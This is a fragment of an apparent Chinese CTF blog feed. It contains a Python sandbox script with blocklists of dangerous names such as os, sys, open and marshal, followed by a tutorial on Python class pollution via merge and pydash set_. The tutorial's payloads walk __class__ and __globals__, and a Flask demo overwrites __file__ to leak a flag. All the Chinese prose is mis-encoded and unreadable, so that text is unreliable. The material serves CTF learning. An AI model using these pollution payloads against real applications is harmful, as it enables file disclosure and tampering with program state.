class="exturl" data-url="aHR0cDovL3huLS1ydW5uZXItOTE3aWs3MGJpbTNmYS5weQ==">ä¹‹åçœ‹çœ‹ runner.py</span>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">source_simple_check</span>(<span class="params">source</span>):</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check the source with pure string in string, prevent dangerous strings</span></span><br><span class="line"><span class="string">    :param source: source code</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> exit</span><br><span class="line">    <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">print</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        source.encode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> UnicodeEncodeError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;non-ascii is not permitted&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="string">&quot;__&quot;</span>, <span class="string">&quot;getattr&quot;</span>, <span class="string">&quot;exit&quot;</span>]:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> source.lower():</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">block_wrapper</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check the run process with sys.audithook, no dangerous operations should be conduct</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">audit</span>(<span class="params">event, args</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">str</span>, <span class="built_in">print</span></span><br><span class="line">        <span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="string">&quot;marshal&quot;</span>, <span class="string">&quot;__new__&quot;</span>, <span class="string">&quot;process&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;sys&quot;</span>, <span class="string">&quot;interpreter&quot;</span>, <span class="string">&quot;cpython&quot;</span>, <span class="string">&quot;open&quot;</span>, <span class="string">&quot;compile&quot;</span>, <span class="string">&quot;gc&quot;</span>]:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> (event + <span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>(s) <span class="keyword">for</span> s <span class="keyword">in</span> args)).lower():</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">                os._exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> audit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source_opcode_checker</span>(<span class="params">code</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check the source in the bytecode aspect, no methods and globals should be load</span></span><br><span class="line"><span class="string">    :param code: source code</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> dis <span class="keyword">import</span> dis</span><br><span class="line">    <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">str</span></span><br><span class="line">    <span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> exit</span><br><span class="line"></span><br><span class="line">    opcodeIO = StringIO()</span><br><span class="line">    dis(code, file=opcodeIO)</span><br><span class="line">    opcode = opcodeIO.getvalue().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    opcodeIO.close()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> opcode:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">any</span>(x <span class="keyword">in</span> <span class="built_in">str</span>(line) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;LOAD_GLOBAL&quot;</span>, <span class="string">&quot;IMPORT_NAME&quot;</span>, <span class="string">&quot;LOAD_METHOD&quot;</span>]):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(x <span class="keyword">in</span> <span class="built_in">str</span>(line) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;randint&quot;</span>, <span class="string">&quot;randrange&quot;</span>, <span class="string">&quot;print&quot;</span>, <span class="string">&quot;seed&quot;</span>]):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([x <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;LOAD_GLOBAL&quot;</span>, <span class="string">&quot;IMPORT_NAME&quot;</span>, <span class="string">&quot;LOAD_METHOD&quot;</span>] <span class="keyword">if</span> x <span class="keyword">in</span> <span class="built_in">str</span>(line)]))</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">open</span></span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> addaudithook</span><br><span class="line">    <span class="keyword">from</span> contextlib <span class="keyword">import</span> redirect_stdout</span><br><span class="line">    <span class="keyword">from</span> random <span class="keyword">import</span> randint, randrange, seed</span><br><span class="line">    <span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line">    <span class="keyword">from</span> random <span class="keyword">import</span> seed</span><br><span class="line">    <span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">    source = <span class="built_in">open</span>(<span class="string">f&quot;/app/uploads/THIS_IS_TASK_RANDOM_ID.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">    source_simple_check(source)</span><br><span class="line">    source_opcode_checker(source)</span><br><span class="line">    code = <span class="built_in">compile</span>(source, <span class="string">&quot;&lt;sandbox&gt;&quot;</span>, <span class="string">&quot;exec&quot;</span>)</span><br><span class="line">    addaudithook(block_wrapper())</span><br><span class="line">    outputIO = StringIO()</span><br><span class="line">    <span class="keyword">with</span> redirect_stdout(outputIO):</span><br><span class="line">        seed(<span class="built_in">str</span>(time()) + <span class="string">&quot;THIS_IS_SEED&quot;</span> + <span class="built_in">str</span>(time()))</span><br><span class="line">        <span class="built_in">exec</span>(code, &#123;</span><br><span class="line">            <span class="string">&quot;__builtins__&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;randint&quot;</span>: randint,</span><br><span class="line">            <span class="string">&quot;randrange&quot;</span>: randrange,</span><br><span class="line">            <span class="string">&quot;seed&quot;</span>: seed,</span><br><span class="line">            <span class="string">&quot;print&quot;</span>: <span class="built_in">print</span></span><br><span class="line">        &#125;, <span class="literal">None</span>)</span><br><span class="line">    output = outputIO.getvalue()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;THIS_IS_SEED&quot;</span> <span class="keyword">in</span> output:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;è¿™ runtime ä½ å°±å˜å˜å†™å§ï¼Œ ä¸€å†™ä¸€ä¸ªä¸å±å£°å•Šï¼Œç‚¹å„¿éƒ½æ²¡æ‹¦ä½ï¼&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;bad code-operation why still happened ah?&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(output)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>â€‹é¦–å…ˆæ˜¯ <code>source_simple_check()</code>  å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ç®€å•æ¥è¯´å°±æ˜¯ç»™ æ‰€æœ‰å…¨è§’å­—ç¬¦éƒ½ ban äº†ï¼Œæ— æ³•ä½¿ç”¨ï¼Œä»¥åŠä¸‰ä¸ªå…³é”®å­—ï¼Œä¹Ÿç»™ ban äº†ã€‚</p><p>â€‹ä¹‹åæ˜¯ <code>block_wrapper()</code> ï¼Œæ£€æµ‹ä»£ç æ‰§è¡Œè¿‡ç¨‹ä¸­äº‹ä»¶å’Œå‚æ•°æ˜¯å¦å«æœ‰é‚£äº›å…³é”®å­— ã€‚</p><p>â€‹ä¹‹åæ˜¯ <code>source_opcode_checker()</code> ï¼Œç›®çš„ä¸ºæ£€æµ‹ç”¨æˆ·ç¨‹åºçš„æ“ä½œç ä¸­æ˜¯å¦å«æœ‰è®¿é—®å…¨å±€å˜é‡ã€å¯¼å…¥æ¨¡å—ä»¥åŠæ–¹æ³•ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Webç‹—çš„è‡ªæˆ‘å®‰æ…° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythonåŸå‹é“¾æ±¡æŸ“</title>
      <link href="/posts/ff5b88d5.html"/>
      <url>/posts/ff5b88d5.html</url>
      
        <content type="html"><![CDATA[<h1 id="pythonåŸå‹é“¾æ±¡æŸ“"><a class="markdownIt-Anchor" href="#pythonåŸå‹é“¾æ±¡æŸ“">#</a> python åŸå‹é“¾æ±¡æŸ“</h1><p>â€‹åé¢ä¼šæœ‰è·Ÿç€ Article_kelp æ…¢æ…¢æ“ä½œçš„ï¼Œå‰é¢å…ˆé¢å‘é¢˜ç›®å­¦ä¹ ã€‚</p><h2 id="èƒŒæ™¯"><a class="markdownIt-Anchor" href="#èƒŒæ™¯">#</a> èƒŒæ™¯ï¼š</h2><p>â€‹å›½èµ›é‡åˆ°äº†è¿™ä¸ªè€ƒç‚¹ï¼Œç„¶åä¹‹åçš„ DASCTF å¤å­£æŒ‘æˆ˜èµ›ä¹Ÿç¢°åˆ°äº†ï¼ŒæŠ“ç´§ç²—ç•¥å­¦ä¸€æ‰‹ï¼Œå­¦äº† JavaScript ä¹‹åå†æ·±ç©¶åŸå‹é“¾æ±¡æŸ“ã€‚</p><h2 id="ç®€ä»‹"><a class="markdownIt-Anchor" href="#ç®€ä»‹">#</a> ç®€ä»‹ï¼š</h2><p>â€‹python ä¸­çš„åŸå‹é“¾æ±¡æŸ“æ˜¯æŒ‡é€šè¿‡ä¿®æ”¹å¯¹è±¡åŸå‹é“¾ä¸­çš„å±æ€§ï¼Œå¯¹ç¨‹åºçš„è¡Œä¸ºäº§ç”Ÿä»¥å¤–å½±å“æˆ–åˆ©ç”¨æ¼æ´è¿›è¡Œæ”»å‡»çš„ä¸€ç§æŠ€æœ¯ã€‚</p><p>â€‹åœ¨ Python ä¸­ï¼Œå¯¹è±¡çš„å±æ€§å’Œæ–¹æ³•å¯ä»¥é€šè¿‡åŸå‹é“¾ç»§æ‰¿æ¥è·å–ã€‚æ¯ä¸ªå¯¹è±¡éƒ½æœ‰ä¸€ä¸ªåŸå‹ï¼ŒåŸå‹ä¸Šå®šä¹‰äº†å¯¹è±¡å¯ä»¥è®¿é—®çš„å±æ€§å’Œæ–¹æ³•ã€‚å½“å¯¹è±¡è®¿é—®å±æ€§æˆ–æ–¹æ³•æ—¶ï¼Œä¼šå…ˆåœ¨è‡ªèº«æŸ¥æ‰¾ï¼Œå¦‚æœæ‰¾ä¸åˆ°å°±ä¼šå»åŸå‹é“¾ä¸Šçš„ä¸Šçº§å¯¹è±¡ä¸­æŸ¥æ‰¾ï¼ŒåŸå‹é“¾æ±¡æŸ“æ”»å‡»çš„æ€è·¯æ˜¯é€šè¿‡ä¿®æ”¹å¯¹è±¡åŸå‹é“¾ä¸­çš„å±æ€§ï¼Œä½¿å¾—ç¨‹åºåœ¨è®¿é—®å±æ€§æˆ–æ–¹æ³•æ—¶å¾—åˆ°ä¸ç¬¦åˆé¢„æœŸçš„ç»“æœã€‚å¸¸è§çš„åŸå‹é“¾æ±¡æŸ“æ”»å‡»åŒ…æ‹¬ä¿®æ”¹å†…ç½®å¯¹è±¡çš„åŸå‹ã€ä¿®æ”¹å…¨å±€å¯¹è±¡çš„åŸå‹ç­‰</p><p>â€‹è¿™ä¸ªçŸ¥è¯†ç‚¹åº”ç”¨çš„èŒƒå›´æ¯”è¾ƒå°ï¼Œä»…å½“é¢˜ç›®ä¸­å‡ºç° <code>utils</code>  çš„ <code>merge</code>  æˆ– <code>Pydash(5.1.2)</code>  æ¨¡å—ä¸­çš„ <code>set</code>  å’Œ <code>set_with</code>  å‡½æ•°æ‰ä¼šç”¨ä¸Šã€‚</p><h2 id="mergeæ²¡é‡åˆ°è¿‡å…·ä½“é¢˜å‹å…ˆç®€å•è¯´ä¸‹"><a class="markdownIt-Anchor" href="#mergeæ²¡é‡åˆ°è¿‡å…·ä½“é¢˜å‹å…ˆç®€å•è¯´ä¸‹">#</a> mergeï¼ˆæ²¡é‡åˆ°è¿‡å…·ä½“é¢˜å‹ï¼Œå…ˆç®€å•è¯´ä¸‹ï¼‰ï¼š</h2><p>â€‹é¦–å…ˆæ˜¯ä¸‹é¢è¿™ä¸ªç¨‹åºï¼Œå¯ä»¥å† merge æ‰“ä¸ªæ–­ç‚¹ï¼Œdebug è¯•è¯•çœ‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>:</span><br><span class="line">    secret = <span class="string">&quot;hello&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_a</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_b</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line">instance = son_b()</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__base__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;secret&quot;</span> : <span class="string">&quot;world&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(son_a.secret)</span><br><span class="line"><span class="comment">#hello</span></span><br><span class="line"><span class="built_in">print</span>(instance.secret)</span><br><span class="line"><span class="comment">#hello</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line"><span class="built_in">print</span>(son_a.secret)</span><br><span class="line"><span class="comment">#world</span></span><br><span class="line"><span class="built_in">print</span>(instance.secret)</span><br><span class="line"><span class="comment">#world</span></span><br><span class="line"><span class="built_in">print</span>(father.secret)</span><br><span class="line"><span class="comment">#world</span></span><br></pre></td></tr></table></figure><p>â€‹è¿™å°±æ˜¯ä¸€ä¸ªç®€å•çš„æ±¡æŸ“ father ç±»çš„ secret å±æ€§çš„ä¸€ä¸ªç¨‹åºï¼Œå¯ä»¥çœ‹åˆ°çš„æ˜¯ï¼Œæœ€å father.secret ç¡®å®æ˜¯è¢«æ±¡æŸ“äº†ã€‚</p><p>â€‹å½“ç„¶ï¼Œå†…ç½®å±æ€§ä¾‹å¦‚ __str__ï¼Œ</p><p>â€‹<strong>ç‰¹åˆ«æ³¨æ„ï¼š</strong></p><p>â€‹å¹¶ä¸æ˜¯æ‰€æœ‰çš„ç±»çš„å±æ€§éƒ½å¯ä»¥è¢«æ±¡æŸ“ï¼Œå¦‚ <code>Object</code>  çš„å±æ€§å°±æ— æ³•è¢«æ±¡æŸ“ï¼Œæ‰€ä»¥éœ€è¦ç›®æ ‡ç±»èƒ½å¤Ÿè¢«åˆ‡å…¥ç‚¹ç±»æˆ–å¯¹è±¡å¯ä»¥é€šè¿‡å±æ€§å€¼æŸ¥æ‰¾è·å–åˆ°</p><blockquote><p><strong>å¤§ä½¬æ˜¯è¿™ä¹ˆè¯´çš„</strong></p><p>é€šè¿‡æ–­ç‚¹è°ƒè¯•å¯ä»¥çœ‹å‡ºè¿™ä¸ª merge å‡½æ•°åœ¨èµ°åˆ° hasattr å¤„ï¼Œç”±äºæˆ‘ä»¬çš„ payload æ˜¯ä¸€å±‚å­—å…¸å¥—ä¸€å±‚å­—å…¸ï¼Œå°±ä¼šé€’å½’è°ƒç”¨ mergeï¼Œå¹¶ä¸”ç”±äº getattr (dst,k)ï¼Œdst å°±åœ¨ä¸€ç›´æŒ‰ç€ payload çš„é”®å‘ç”Ÿå˜åŒ–ï¼Œä»åˆ°ç±»ï¼Œå†åˆ°çˆ¶ç±»ï¼Œæœ€åæŠŠçˆ¶ç±»çš„ secret èµ‹å€¼ä¸º pollutedï¼ŒæˆåŠŸå®ç°äº†åŸå‹é“¾æ±¡æŸ“ã€‚</p><p>payload ä¹Ÿå¾ˆå¥½ç†è§£ï¼Œå…¶å®å°±æ˜¯åˆ©ç”¨äº† python çš„é“¾å¼ç»§æ‰¿å…³ç³»ï¼Œæœ€åæ‰¾åˆ°è¿™ä¸ªç±»å³å¯ï¼Œå’Œ SSTI é€šè¿‡é“¾å¼ç»§æ‰¿å…³ç³»æ‰¾ os æ¨¡å—å¾ˆåƒã€‚</p><p>ç±»çš„å†…ç½®å±æ€§ï¼Œå¦‚ <code>__str__</code> ä¹Ÿå¯ä»¥è¢«æ±¡æŸ“ï¼Œä½†æ˜¯éœ€è¦æ³¨æ„ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰ç±»çš„å±æ€§éƒ½å¯ä»¥è¢«æ±¡æŸ“ï¼Œæ¯”å¦‚ <code>Object</code>  å°±æ— æ³•è¢«æ±¡æŸ“ã€‚</p></blockquote><h2 id="pydash512"><a class="markdownIt-Anchor" href="#pydash512">#</a> pydash(5.1.2)ï¼š</h2><p>â€‹ç”±äºæš‚æ—¶ä¸ä¼š Sanic æ¡†æ¶çš„ç¼–å†™ï¼Œæ‰€ä»¥å…ˆæš‚æ—¶ç”¨ä¸‹ flask æ¡†æ¶ï¼Œ å·®è·åº”è¯¥ä¸å¤§ã€‚</p><p>â€‹å…ˆçœ‹çœ‹ä¸‹é¢è¿™ä¸ªä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pydash <span class="keyword">import</span> set_</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Father</span>:</span><br><span class="line">    secret_value = <span class="string">&quot;safe&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollution</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">pollutant = Pollution()</span><br><span class="line">father = Father()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;key&quot;</span> : <span class="string">&quot;__class__.__init__.__globals__.father.secret_value&quot;</span>,</span><br><span class="line">    <span class="string">&quot;value&quot;</span> : <span class="string">&quot;polluted&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">key = payload[<span class="string">&quot;key&quot;</span>]</span><br><span class="line">value = payload[<span class="string">&quot;value&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(father.secret_value)</span><br><span class="line"><span class="comment">#safe</span></span><br><span class="line">set_(pollutant,key, value)</span><br><span class="line"><span class="built_in">print</span>(father.secret_value)</span><br><span class="line"><span class="comment">#polluted</span></span><br></pre></td></tr></table></figure><p>â€‹å¦‚ä¸Šï¼Œæˆ‘ä»¬æœ€åæˆåŠŸæ±¡æŸ“äº† Father ç±»çš„ secret_value å±æ€§ï¼Œå¤§æ¦‚æ€è·¯å°±æ˜¯é€šè¿‡ key é‡Œçš„è¿™ä¸ªé“¾å­å»æ‰¾åˆ° father.secret_value è¿™ä¸ªå±æ€§ï¼Œç„¶åè¿›è¡Œæ±¡æŸ“ï¼Œæ±¡æŸ“ä¸º value çš„å€¼ã€‚</p><p>â€‹ä¹Ÿæ­£å› ä¸ºå¦‚æ­¤ï¼Œæ‰€ä»¥å†™ä¸€ä¸ª Web æœåŠ¡æ¥è¯•è¯•çœ‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> pydash <span class="keyword">import</span> set_</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/pollute&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Pollution</span>():</span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">r&quot;key&quot;</span>: <span class="string">r&quot;__init__.__globals__.__file__&quot;</span>,</span><br><span class="line">        <span class="string">r&quot;value&quot;</span>: <span class="string">r&quot;D:\html study\PyCharm Project\flask_pydash1\flag&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    key = payload[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">    value = payload[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">    pollute = Pollute()</span><br><span class="line">    set_(pollute,key,value)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Finished pollute &quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>â€‹ä¸çŸ¥ä¸ºä½•ï¼Œè¿™é‡Œå†™çš„ Web æœåŠ¡ä¸­ï¼ŒPollution () è¿™é‡Œä¼ å…¥ reqeust å‚æ•°æ€»æ˜¯ä¼šå‡ºé”™ï¼Œæ‰€ä»¥è¿™é‡Œå°±ç”¨è¿™ç§æ–¹å¼ç›´æ¥è§„å®šäº† key å’Œ value çš„å€¼ï¼Œä½œä¸ºä¸€ç§è¾“å…¥æ–¹å¼ã€‚</p><p>â€‹é¦–å…ˆç¬¬ä¸€æ¬¡è®¿é—®æ ¹è·¯ç”±ï¼Œå¾—åˆ°çš„é¡µé¢å¦‚ä¸‹ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/188c10d495a342d4927f7d8a8b841d58.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹ä¹‹åï¼Œå°è¯•è®¿é—®ä¸‹ /pollute è·¯ç”±ï¼Œè¿”å›äº†ä¸€ä¸ª Finished pollute ï¼Œéšåå†å»è®¿é—®ä¸‹æ ¹è·¯ç”±ï¼Œå¾—åˆ°çš„å¦‚ä¸‹ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/e35d4eadef714422b7670dcc405fc905.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹æˆåŠŸè¯»å–åˆ°äº†æˆ‘æå‰å‡†å¤‡çš„ flagã€‚</p><p>â€‹åŸå› å°±æ˜¯å› ä¸ºåœ¨__globals__é‡Œæ‰¾åˆ°äº†__file__å±æ€§ï¼Œç„¶åæ‰èƒ½è¿›è¡Œæ±¡æŸ“ã€‚</p><h2 